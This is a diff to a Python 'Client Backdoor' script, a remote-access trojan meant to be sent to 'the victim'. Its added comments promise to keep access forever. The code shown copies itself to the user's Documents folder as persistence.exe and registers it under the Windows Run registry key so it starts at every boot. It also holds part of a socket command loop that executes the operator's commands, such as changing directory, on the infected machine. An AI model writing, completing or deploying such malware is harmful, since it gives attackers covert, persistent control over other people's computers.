@@ -1,4 +1,8 @@
 #Client Backdoor
+#Use this backdoor with TCP-Server.py
+#Launch the TCP-server.py, send this to the victim and voila
+#This backdoor is persistence, modify the registry key on windows and every time the victim turns on the computer You should
+#have the tcp-server listening, just go brow #JustGo Infect just once and maintaing acess 4ever
 
 import socket 
 import subprocess 
@@ -11,8 +15,8 @@ destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'
 
 if not os.path.exists(destination):  
 
-    shutil.copyfile(path+'\persistence.exe', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
-                                                         # and we will get the same result
+    shutil.copyfile(path+'\persistence.exe', destination)
+                                                        
     key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                          wreg.KEY_ALL_ACCESS)
     wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
@@ -55,10 +59,10 @@ def connect():
         
 
 
-        elif 'cd' in command: # the forumal here is gonna be cd then space then the path that we want to go to, like  cd C:\Users
-            code,directory = command.split (' ') # split up the reiceved command based on space into two variables
-            os.chdir(directory) # changing the directory 
-            s.send( "[+] CWD Is " + os.getcwd() ) # we send back a string mentioning the new CWD
+        elif 'cd' in command: 
+            code,directory = command.split (' ') 
+            os.chdir(directory) 
+            s.send( "[+] CWD Is " + os.getcwd() ) 
 
             
         
